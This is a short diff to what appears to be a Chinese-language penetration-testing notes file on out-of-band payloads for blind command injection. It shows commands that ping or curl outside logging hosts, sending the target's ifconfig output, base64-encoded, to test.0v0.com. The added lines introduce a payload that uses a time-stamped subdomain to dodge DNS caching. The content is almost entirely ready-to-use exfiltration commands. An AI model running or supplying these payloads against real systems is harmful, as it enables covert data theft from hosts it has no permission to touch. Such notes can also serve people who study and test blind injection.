@@ -210,5 +210,9 @@ ping -c 3 `ifconfig en0|grep "inet "|awk '{print $2}'`.test.0v0.com
 #4.获取命令结果
 curl test.0v0.com/`ifconfig|base64 -w 0`
 
+#5.当频繁请求时，如果使用固定的域名，服务器将不会发起请求，而是使用缓存，也就是说我们将有可能收不到DNS请求。
+#下面这个payload可以提供变化的子域名
+ping -c 3 `date +%H-%M-%S`.test.0y0.link
+
 ```
 
